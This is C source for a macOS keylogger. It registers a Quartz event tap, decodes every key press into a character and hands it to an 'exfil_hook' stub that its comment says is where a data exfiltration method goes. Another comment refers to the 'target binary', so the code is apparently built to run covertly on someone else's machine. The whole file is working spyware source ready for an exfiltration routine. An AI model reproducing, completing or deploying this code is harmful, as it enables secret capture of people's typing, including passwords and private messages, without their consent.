#include "maclog.h"
#include <Carbon/Carbon.h>
#include <CoreFoundation/CoreFoundation.h>
#include <CoreGraphics/CoreGraphics.h>
#include <stdio.h>


/*
 * Returns the CFString associated with the given keycode.
 */
static CFStringRef get_cfstring(CGKeyCode keycode, UInt32 modifiers) 
{
        TISInputSourceRef keyboard = TISCopyCurrentKeyboardInputSource();
        CFDataRef layout_data = TISGetInputSourceProperty(keyboard,
							  kTISPropertyUnicodeKeyLayoutData);
        const UCKeyboardLayout *layout = (const UCKeyboardLayout *) CFDataGetBytePtr(layout_data);
        UInt32 deadkey = 0;
        UniChar unichar[4];
        UniCharCount count;
        UCKeyTranslate(layout,
                       keycode,
                       kUCKeyActionDisplay,
                       (modifiers >> 8) & 0xFF,
                       LMGetKbdType(),
                       kUCKeyTranslateNoDeadKeysBit,
                       &deadkey,
                       sizeof(unichar) / sizeof(unichar[0]),
                       &count,
                       unichar);
        CFRelease(keyboard);

        return CFStringCreateWithCharacters(kCFAllocatorDefault, unichar, 1);
}


/*
 * A function that allows you to hook in your chosen data exfiltration soultion.
 */
static void exfil_hook(char *keystroke, size_t size)
{

	// Replace this code
	printf("%s\n", keystroke);
}


/*
 * Callback function for the event tap. It is invoked when the event tap
 * receives a Quartz event.
 */
static CGEventRef log_keystroke(CGEventTapProxy proxy,
			        CGEventType event_type,
			     	CGEventRef event,
			     	void *user_info) 
{
        if (event_type == kCGEventKeyDown) {
                CGKeyCode keycode = (CGKeyCode) CGEventGetIntegerValueField(event,
									    kCGKeyboardEventKeycode);
		UInt32 modifiers = GetCurrentKeyModifiers();
                CFStringRef cfstr = get_cfstring(keycode, modifiers);
                CFIndex size = CFStringGetMaximumSizeForEncoding(1, 
								 kCFStringEncodingUTF8);
                char keystroke[size];
                CFStringGetCString(cfstr, 
				   keystroke,
				   size,
				   kCFStringEncodingUTF8);
		exfil_hook(keystroke, (size_t) size);
        }

	return event;
}


/*
 * Runs the keylogger.
 */
void maclog() 
{
	CGEventMask events = CGEventMaskBit(kCGEventKeyDown);
        CFMachPortRef event_tap = CGEventTapCreate(kCGSessionEventTap,
						   kCGHeadInsertEventTap,
						   kCGEventTapOptionDefault,
						   events,
						   log_keystroke,
						   NULL);
        if(!event_tap) {
		// Target binary does not have accessibility permissions
                exit(1);
        }
        CFRunLoopSourceRef runloop_src = CFMachPortCreateRunLoopSource(kCFAllocatorDefault,
								       event_tap,
								       0);
        CFRunLoopAddSource(CFRunLoopGetCurrent(),
			   runloop_src,
			   kCFRunLoopCommonModes);
        CFRunLoopRun();
}

